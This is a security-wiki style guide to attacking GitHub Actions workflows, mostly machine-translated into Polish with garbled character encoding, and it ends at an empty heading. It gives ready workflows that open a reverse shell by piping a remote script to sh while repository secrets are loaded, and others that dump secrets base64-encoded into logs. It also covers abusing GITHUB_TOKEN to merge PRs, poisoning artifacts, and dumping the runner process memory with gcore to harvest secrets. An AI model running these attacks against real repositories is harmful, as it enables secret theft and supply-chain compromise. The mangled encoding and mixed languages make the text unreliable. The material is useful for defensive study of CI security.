# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

In this page you will find:

* A **summary of all the impacts** of an attacker managing to access a Github Action
* Different ways to **get access to an action**:
* Having **permissions** to create the action
* Abusing **pull request** related triggers
* Abusing **other external access** techniques
* **Pivoting** from an already compromised repo
* Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

In case you can **execute arbitrary Github actions/inject code** in a **repository**, you could be able to:

* **KraÅ›Ä‡** **sekrety** z tego repozytorium/organizacji.
* If you can only inject, you can steal whatever is already present in the workflow.
* Abuse **repo privileges** to access other platforms such as AWS and GCP.
* **WykonywaÄ‡ kod w niestandardowych pracownikach** (if custom workers are used) and try to pivot from there.
* **NadpisywaÄ‡** **kod** repozytorium.
* This depends on the privileges of the `GITHUB_TOKEN` (if any).
* **KompromitowaÄ‡** **wdroÅ¼enia** i inne **artefakty**.
* If the code is deploying or storing something you could modify that and obtain some further access.

## GITHUB\_TOKEN

This "**sekret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.
{% endhint %}

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="ZatwierdÅº PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="UtwÃ³rz PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
ZauwaÅ¼, Å¼e w kilku przypadkach bÄ™dziesz mÃ³gÅ‚ znaleÅºÄ‡ **tokeny uÅ¼ytkownikÃ³w githuba w zmiennych Å›rodowiskowych Github Actions lub w sekretach**. Te tokeny mogÄ… daÄ‡ ci wiÄ™cej uprawnieÅ„ do repozytorium i organizacji.
{% endhint %}

<details>

<summary>Lista sekretÃ³w w wyjÅ›ciu Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj powÅ‚okÄ™ odwrotnÄ… z sekretami</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

MoÅ¼liwe jest sprawdzenie uprawnieÅ„ nadanych tokenowi Github w repozytoriach innych uÅ¼ytkownikÃ³w **sprawdzajÄ…c logi** akcji:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozwolone Wykonanie

{% hint style="info" %}
To byÅ‚by najÅ‚atwiejszy sposÃ³b na kompromitacjÄ™ akcji Github, poniewaÅ¼ ten przypadek zakÅ‚ada, Å¼e masz dostÄ™p do **utworzenia nowego repozytorium w organizacji** lub masz **uprawnienia do zapisu w repozytorium**.

JeÅ›li jesteÅ› w tym scenariuszu, moÅ¼esz po prostu sprawdziÄ‡ [techniki poeksploatacyjne](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Wykonanie z Utworzenia Repozytorium

W przypadku, gdy czÅ‚onkowie organizacji mogÄ… **tworzyÄ‡ nowe repozytoria** i moÅ¼esz wykonywaÄ‡ akcje github, moÅ¼esz **utworzyÄ‡ nowe repozytorium i ukraÅ›Ä‡ sekrety ustawione na poziomie organizacji**.

### Wykonanie z Nowej GaÅ‚Ä™zi

JeÅ›li moÅ¼esz **utworzyÄ‡ nowÄ… gaÅ‚Ä…Åº w repozytorium, ktÃ³re juÅ¼ zawiera skonfigurowanÄ… akcjÄ™ Github**, moÅ¼esz jÄ… **zmodyfikowaÄ‡**, **zaÅ‚adowaÄ‡** zawartoÅ›Ä‡, a nastÄ™pnie **wykonaÄ‡ tÄ™ akcjÄ™ z nowej gaÅ‚Ä™zi**. W ten sposÃ³b moÅ¼esz **wyeksfiltrowaÄ‡ sekrety na poziomie repozytorium i organizacji** (ale musisz wiedzieÄ‡, jak siÄ™ nazywajÄ…).

MoÅ¼esz uczyniÄ‡ zmodyfikowanÄ… akcjÄ™ wykonalnÄ… **rÄ™cznie**, gdy **zostanie utworzony PR** lub gdy **zostanie przesÅ‚any jakiÅ› kod** (w zaleÅ¼noÅ›ci od tego, jak gÅ‚oÅ›ny chcesz byÄ‡):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Wykonanie z Forka

{% hint style="info" %}
IstniejÄ… rÃ³Å¼ne wyzwalacze, ktÃ³re mogÄ… pozwoliÄ‡ atakujÄ…cemu na **wykonanie akcji Github innego repozytorium**. JeÅ›li te wyzwalane akcje sÄ… Åºle skonfigurowane, atakujÄ…cy moÅ¼e byÄ‡ w stanie je skompromitowaÄ‡.
{% endhint %}

### `pull_request`

Wyzwalacz workflow **`pull_request`** wykona workflow za kaÅ¼dym razem, gdy otrzymany zostanie pull request z pewnymi wyjÄ…tkami: domyÅ›lnie, jeÅ›li to jest **pierwszy raz**, gdy **wspÃ³Å‚pracujesz**, niektÃ³rzy **utrzymujÄ…cy** bÄ™dÄ… musieli **zatwierdziÄ‡** **wykonanie** workflow:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
PoniewaÅ¼ **domyÅ›lne ograniczenie** dotyczy **pierwszych** wspÃ³Å‚pracownikÃ³w, moÅ¼esz przyczyniÄ‡ siÄ™ do **naprawy waÅ¼nego bÅ‚Ä™du/ortografii**, a nastÄ™pnie wysÅ‚aÄ‡ **inne PR-y, aby naduÅ¼yÄ‡ swoich nowych uprawnieÅ„ `pull_request`**.

**TestowaÅ‚em to i to nie dziaÅ‚a**: ~~InnÄ… opcjÄ… byÅ‚oby stworzenie konta o nazwie kogoÅ›, kto przyczyniÅ‚ siÄ™ do projektu i usuniÄ™cie jego konta.~~
{% endhint %}

Ponadto, domyÅ›lnie **zapobiega uprawnieniom do zapisu** i **dostÄ™powi do sekretÃ³w** w docelowym repozytorium, jak wspomniano w [**dokumentacji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Z wyjÄ…tkiem `GITHUB_TOKEN`, **sekrety nie sÄ… przekazywane do runnera**, gdy workflow jest wyzwalany z **forkowanego** repozytorium. **`GITHUB_TOKEN ma uprawnienia tylko do odczytu** w pull requestach **z forkowanych repozytoriÃ³w**.

AtakujÄ…cy mÃ³gÅ‚by zmodyfikowaÄ‡ definicjÄ™ akcji Github, aby wykonaÄ‡ dowolne rzeczy i dodaÄ‡ dowolne akcje. Jednak nie bÄ™dzie w stanie ukraÅ›Ä‡ sekretÃ³w ani nadpisaÄ‡ repozytorium z powodu wspomnianych ograniczeÅ„.

{% hint style="danger" %}
**Tak, jeÅ›li atakujÄ…cy zmieni w PR akcjÄ™ github, ktÃ³ra zostanie wyzwolona, jego akcja Github bÄ™dzie uÅ¼ywana, a nie ta z repozytorium ÅºrÃ³dÅ‚owego!**
{% endhint %}

PoniewaÅ¼ atakujÄ…cy kontroluje rÃ³wnieÅ¼ kod, ktÃ³ry jest wykonywany, nawet jeÅ›li nie ma sekretÃ³w ani uprawnieÅ„ do zapisu na `GITHUB_TOKEN`, atakujÄ…cy mÃ³gÅ‚by na przykÅ‚ad **przesÅ‚aÄ‡ zÅ‚oÅ›liwe artefakty**.

### **`pull_request_target`**

Wyzwalacz workflow **`pull_request_target`** ma **uprawnienia do zapisu** w docelowym repozytorium i **dostÄ™p do sekretÃ³w** (i nie prosi o pozwolenie).

ZauwaÅ¼, Å¼e wyzwalacz workflow **`pull_request_target`** **dziaÅ‚a w kontekÅ›cie bazowym** i nie w tym, ktÃ³ry jest podany przez PR (aby **nie wykonywaÄ‡ nieufnego kodu**). Aby uzyskaÄ‡ wiÄ™cej informacji na temat `pull_request_target`, [**sprawdÅº dokumentacjÄ™**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Ponadto, aby uzyskaÄ‡ wiÄ™cej informacji na temat tego konkretnego niebezpiecznego uÅ¼ycia, sprawdÅº ten [**post na blogu githuba**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

MoÅ¼e siÄ™ wydawaÄ‡, Å¼e poniewaÅ¼ **wykonywany workflow** jest tym zdefiniowanym w **bazie** i **nie w PR**, jest **bezpieczne** uÅ¼ywanie **`pull_request_target`**, ale istnieje **kilka przypadkÃ³w, w ktÃ³rych tak nie jest**.

A ten bÄ™dzie miaÅ‚ **dostÄ™p do sekretÃ³w**.

### `workflow_run`

Wyzwalacz [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) pozwala na uruchomienie workflow z innego, gdy jest `ukoÅ„czony`, `zaÅ¼Ä…dany` lub `w trakcie`.

W tym przykÅ‚adzie workflow jest skonfigurowany do uruchomienia po zakoÅ„czeniu oddzielnego workflow "Uruchom testy":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: Workflow uruchomiony przez zdarzenie `workflow_run` ma moÅ¼liwoÅ›Ä‡ **dostÄ™pu do sekretÃ³w i zapisywania tokenÃ³w, nawet jeÅ›li poprzedni workflow nie miaÅ‚**.

Tego rodzaju workflow moÅ¼e byÄ‡ zaatakowany, jeÅ›li **zaleÅ¼y** od **workflow**, ktÃ³ry moÅ¼e byÄ‡ **wyzwolony** przez zewnÄ™trznego uÅ¼ytkownika za pomocÄ… **`pull_request`** lub **`pull_request_target`**. Kilka podatnych przykÅ‚adÃ³w moÅ¼na [**znaleÅºÄ‡ w tym blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Pierwszy z nich polega na tym, Å¼e **`workflow_run`** uruchamia workflow, ktÃ³ry pobiera kod atakujÄ…cego: `${{ github.event.pull_request.head.sha }}`\
Drugi polega na **przekazywaniu** **artefaktu** z **niezaufanego** kodu do workflow **`workflow_run`** i uÅ¼ywaniu zawartoÅ›ci tego artefaktu w sposÃ³b, ktÃ³ry czyni go **podatnym na RCE**.

### `workflow_call`

TODO

TODO: SprawdÅº, czy podczas wykonywania z pull\_request uÅ¼ywany/pobierany kod pochodzi z oryginaÅ‚u czy z forka PR

## Wykorzystywanie Wykonania Forka

WspomnieliÅ›my o wszystkich sposobach, w jakie zewnÄ™trzny atakujÄ…cy mÃ³gÅ‚by sprawiÄ‡, Å¼e workflow githuba zostanie uruchomiony, teraz przyjrzyjmy siÄ™, jak te wykonania, jeÅ›li sÄ… Åºle skonfigurowane, mogÄ… byÄ‡ wykorzystywane:

### Wykonanie niezaufanego checkoutu

W przypadku **`pull_request`** workflow bÄ™dzie wykonywany w **kontekÅ›cie PR** (wiÄ™c wykona **zÅ‚oÅ›liwy kod PR**), ale ktoÅ› musi **najpierw to autoryzowaÄ‡** i bÄ™dzie dziaÅ‚aÅ‚ z pewnymi [ograniczeniami](./#pull\_request).

W przypadku workflow uÅ¼ywajÄ…cego **`pull_request_target` lub `workflow_run`**, ktÃ³ry zaleÅ¼y od workflow, ktÃ³ry moÅ¼e byÄ‡ wyzwolony z **`pull_request_target` lub `pull_request`**, kod z oryginalnego repozytorium zostanie wykonany, wiÄ™c **atakujÄ…cy nie moÅ¼e kontrolowaÄ‡ wykonanego kodu**.

{% hint style="danger" %}
JednakÅ¼e, jeÅ›li **akcja** ma **wyraÅºny checkout PR**, ktÃ³ry **pobierze kod z PR** (a nie z bazy), uÅ¼yje kodu kontrolowanego przez atakujÄ…cego. Na przykÅ‚ad (sprawdÅº liniÄ™ 12, gdzie kod PR jest pobierany):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencjalnie **niezaufany kod jest uruchamiany podczas `npm install` lub `npm build`**, poniewaÅ¼ skrypty budowania i odwoÅ‚ane **pakiety sÄ… kontrolowane przez autora PR**.

{% hint style="warning" %}
Dork githuba do wyszukiwania podatnych akcji to: `event.pull_request pull_request_target extension:yml`, jednak istniejÄ… rÃ³Å¼ne sposoby konfigurowania zadaÅ„, aby byÅ‚y wykonywane bezpiecznie, nawet jeÅ›li akcja jest skonfigurowana niebezpiecznie (jak uÅ¼ywanie warunkÃ³w dotyczÄ…cych tego, kto jest aktorem generujÄ…cym PR).
{% endhint %}

### WstrzykniÄ™cia SkryptÃ³w w KontekÅ›cie <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

ZauwaÅ¼, Å¼e istniejÄ… pewne [**konteksty githuba**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context), ktÃ³rych wartoÅ›ci sÄ… **kontrolowane** przez **uÅ¼ytkownika** tworzÄ…cego PR. JeÅ›li akcja githuba uÅ¼ywa tych **danych do wykonania czegokolwiek**, moÅ¼e to prowadziÄ‡ do **wykonania dowolnego kodu:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **WstrzykniÄ™cie Skryptu GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Z dokumentacji: MoÅ¼esz udostÄ™pniÄ‡ **zmiennÄ… Å›rodowiskowÄ… dla wszystkich kolejnych krokÃ³w** w zadaniu workflow, definiujÄ…c lub aktualizujÄ…c zmiennÄ… Å›rodowiskowÄ… i zapisujÄ…c jÄ… w pliku Å›rodowiskowym **`GITHUB_ENV`**.

JeÅ›li atakujÄ…cy mÃ³gÅ‚by **wstrzyknÄ…Ä‡ dowolnÄ… wartoÅ›Ä‡** do tej **zmiennej env**, mÃ³gÅ‚by wstrzyknÄ…Ä‡ zmienne Å›rodowiskowe, ktÃ³re mogÅ‚yby wykonaÄ‡ kod w kolejnych krokach, takie jak **LD\_PRELOAD** lub **NODE\_OPTIONS**.

Na przykÅ‚ad ([**to**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**to**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), wyobraÅº sobie workflow, ktÃ³ry ufa przesÅ‚anemu artefaktowi, aby przechowaÄ‡ jego zawartoÅ›Ä‡ w zmiennej Å›rodowiskowej **`GITHUB_ENV`**. AtakujÄ…cy mÃ³gÅ‚by przesÅ‚aÄ‡ coÅ› takiego, aby to skompromitowaÄ‡:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Podatne Akcje Githuba Trzeciej Strony

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Jak wspomniano w [**tym poÅ›cie na blogu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ta Akcja Githuba pozwala na dostÄ™p do artefaktÃ³w z rÃ³Å¼nych workflow, a nawet repozytoriÃ³w.

Problem polega na tym, Å¼e jeÅ›li parametr **`path`** nie jest ustawiony, artefakt jest wyodrÄ™bniany w bieÅ¼Ä…cym katalogu i moÅ¼e nadpisywaÄ‡ pliki, ktÃ³re mogÄ… byÄ‡ pÃ³Åºniej uÅ¼ywane lub nawet wykonywane w workflow. Dlatego, jeÅ›li artefakt jest podatny, atakujÄ…cy mÃ³gÅ‚by to wykorzystaÄ‡, aby skompromitowaÄ‡ inne workflow ufajÄ…ce artefaktowi.

PrzykÅ‚ad podatnego workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
To moÅ¼na zaatakowaÄ‡ za pomocÄ… tego przepÅ‚ywu pracy:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Inny dostÄ™p zewnÄ™trzny

### PrzejÄ™cie usuniÄ™tego repozytorium przestrzeni nazw

JeÅ›li konto zmieni swojÄ… nazwÄ™, inny uÅ¼ytkownik moÅ¼e zarejestrowaÄ‡ konto o tej samej nazwie po pewnym czasie. JeÅ›li repozytorium miaÅ‚o **mniej niÅ¼ 100 gwiazdek przed zmianÄ… nazwy**, Github pozwoli nowemu zarejestrowanemu uÅ¼ytkownikowi o tej samej nazwie na utworzenie **repozytorium o tej samej nazwie** co usuniÄ™te.

{% hint style="danger" %}
WiÄ™c jeÅ›li akcja korzysta z repozytorium z nieistniejÄ…cego konta, nadal moÅ¼liwe jest, Å¼e atakujÄ…cy mÃ³gÅ‚by utworzyÄ‡ to konto i skompromitowaÄ‡ akcjÄ™.
{% endhint %}

JeÅ›li inne repozytoria korzystaÅ‚y z **zaleÅ¼noÅ›ci z repozytoriÃ³w tego uÅ¼ytkownika**, atakujÄ…cy bÄ™dzie mÃ³gÅ‚ je przejÄ…Ä‡. Oto bardziej szczegÃ³Å‚owe wyjaÅ›nienie: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## PrzeÅ‚Ä…czanie repozytoriÃ³w

{% hint style="info" %}
W tej sekcji porozmawiamy o technikach, ktÃ³re pozwoliÅ‚yby na **przeÅ‚Ä…czenie z jednego repozytorium do drugiego**, zakÅ‚adajÄ…c, Å¼e mamy jakiÅ› rodzaj dostÄ™pu do pierwszego (sprawdÅº poprzedniÄ… sekcjÄ™).
{% endhint %}

### Zatrucie pamiÄ™ci podrÄ™cznej

PamiÄ™Ä‡ podrÄ™czna jest utrzymywana miÄ™dzy **uruchomieniami workflow w tej samej gaÅ‚Ä™zi**. Oznacza to, Å¼e jeÅ›li atakujÄ…cy **skompromituje** **pakiet**, ktÃ³ry nastÄ™pnie jest przechowywany w pamiÄ™ci podrÄ™cznej i **pobierany** oraz wykonywany przez **bardziej uprzywilejowany** workflow, bÄ™dzie mÃ³gÅ‚ rÃ³wnieÅ¼ **skompromitowaÄ‡** ten workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Zatrucie artefaktÃ³w

Workflow mogÄ… korzystaÄ‡ z **artefaktÃ³w z innych workflow, a nawet repozytoriÃ³w**, jeÅ›li atakujÄ…cemu uda siÄ™ **skompromitowaÄ‡** Github Action, ktÃ³ra **przesyÅ‚a artefakt**, ktÃ³ry jest pÃ³Åºniej uÅ¼ywany przez inny workflow, mÃ³gÅ‚by **skompromitowaÄ‡ inne workflow**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Po eksploatacji z akcji

### Uzyskiwanie dostÄ™pu do AWS i GCP za pomocÄ… OIDC

SprawdÅº nastÄ™pujÄ…ce strony:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Uzyskiwanie dostÄ™pu do sekretÃ³w <a href="#accessing-secrets" id="accessing-secrets"></a>

JeÅ›li wstrzykujesz zawartoÅ›Ä‡ do skryptu, warto wiedzieÄ‡, jak moÅ¼esz uzyskaÄ‡ dostÄ™p do sekretÃ³w:

* JeÅ›li sekret lub token jest ustawiony jako **zmienna Å›rodowiskowa**, moÅ¼na go bezpoÅ›rednio uzyskaÄ‡ przez Å›rodowisko, uÅ¼ywajÄ…c **`printenv`**.

<details>

<summary>Lista sekretÃ³w w wyjÅ›ciu Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj powÅ‚okÄ™ odwrotnÄ… z sekretami</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* JeÅ›li sekret jest uÅ¼ywany **bezpoÅ›rednio w wyraÅ¼eniu**, wygenerowany skrypt powÅ‚oki jest przechowywany **na dysku** i jest dostÄ™pny.
* ```bash
cat /home/runner/work/_temp/*
```
* W przypadku akcji JavaScript sekrety sÄ… przesyÅ‚ane przez zmienne Å›rodowiskowe.
* ```bash
ps axe | grep node
```
* Dla **niestandardowej akcji** ryzyko moÅ¼e siÄ™ rÃ³Å¼niÄ‡ w zaleÅ¼noÅ›ci od tego, jak program uÅ¼ywa uzyskanego sekretu z **argumentu**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Wykorzystywanie samodzielnie hostowanych runnerÃ³w

Sposobem na znalezienie, ktÃ³re **Github Actions sÄ… wykonywane w infrastrukturze niebÄ™dÄ…cej Github** jest wyszukiwanie **`runs-on: self-hosted`** w konfiguracji yaml akcji Github.

**Samodzielnie hostowane** runnery mogÄ… mieÄ‡ dostÄ™p do **dodatkowych wraÅ¼liwych informacji**, do innych **systemÃ³w sieciowych** (wraÅ¼liwe punkty koÅ„cowe w sieci? usÅ‚uga metadanych?) lub, nawet jeÅ›li sÄ… izolowane i zniszczone, **wiÄ™cej niÅ¼ jedna akcja moÅ¼e byÄ‡ uruchamiana w tym samym czasie** i zÅ‚oÅ›liwa mogÅ‚aby **ukraÅ›Ä‡ sekrety** innej.

W samodzielnie hostowanych runnerach moÅ¼liwe jest rÃ³wnieÅ¼ uzyskanie **sekretÃ³w z procesu \_Runner.Listener**\_\*\* ktÃ³ry bÄ™dzie zawieraÅ‚ wszystkie sekrety workflow na kaÅ¼dym etapie, zrzucajÄ…c jego pamiÄ™Ä‡:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

SprawdÅº [**ten post, aby uzyskaÄ‡ wiÄ™cej informacji**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Rejestr obrazÃ³w Docker w Github

MoÅ¼liwe jest tworzenie akcji Github, ktÃ³re **budujÄ… i przechowujÄ… obraz Docker w Github**.\
PrzykÅ‚ad moÅ¼na znaleÅºÄ‡ w nastÄ™pujÄ…cym rozwijanym:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Jak moÅ¼na zobaczyÄ‡ w poprzednim kodzie, rejestr Github jest hostowany w **`ghcr.io`**.

UÅ¼ytkownik z uprawnieniami do odczytu repozytorium bÄ™dzie mÃ³gÅ‚ pobraÄ‡ obraz Dockera za pomocÄ… tokena dostÄ™pu osobistego:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **wyciekÅ‚e sekrety w warstwach obrazu Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### WraÅ¼liwe informacje w logach Github Actions

Nawet jeÅ›li **Github** prÃ³buje **wykrywaÄ‡ wartoÅ›ci sekretÃ³w** w logach akcji i **unikaÄ‡ ich pokazywania**, **inne wraÅ¼liwe dane**, ktÃ³re mogÅ‚y zostaÄ‡ wygenerowane podczas wykonywania akcji, nie bÄ™dÄ… ukryte. Na przykÅ‚ad JWT podpisany wartoÅ›ciÄ… sekretu nie bÄ™dzie ukryty, chyba Å¼e jest [specjalnie skonfigurowany](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Zacieranie Å›ladÃ³w

